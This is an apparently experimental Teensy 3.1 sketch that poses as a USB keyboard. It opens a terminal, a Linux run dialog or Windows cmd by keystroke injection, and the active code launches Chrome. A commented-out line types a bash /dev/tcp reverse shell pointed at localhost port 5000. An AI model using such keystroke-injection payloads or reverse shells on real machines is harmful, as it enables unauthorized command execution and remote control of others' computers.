// teensy 3.1

int led = 13;

void setup() {
  delay(1000);

  pinMode(led, OUTPUT);
  digitalWrite(led, HIGH);

  delay(1000);
  openTerminal();
  //openApp("google-chrome");
  //type("/bin/bash ");
  //type("exec 196<>/dev/tcp/127.0.0.1/5000; <&196 >&196 2>&196");
  //openApp("start chrome 'google.com' ");

  run("google-chrome");

  delay(2000);
}


// universal

void type(String chars) {
  Keyboard.print(chars);
  Keyboard.println("");
}

void openApp(String app) {
  Keyboard.print(app);
  delay(200);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

// Linux
void run(String cmd) {
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_F2);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  delay(50);
  Keyboard.send_now();
  Keyboard.print(cmd);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
void openTerminal() {

  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_T);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(200);
}

// windows
 void openCMD() {

  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.send_now();
  Keyboard.set_modifier(MODIFIERKEY_GUI | KEY_R);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(100);
  Keyboard.print("cmd");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(200);

 }


// loop

void loop() {
  // flash when done
  digitalWrite(led, HIGH);
  delay(100);
  digitalWrite(led, LOW);
  delay(100);
}

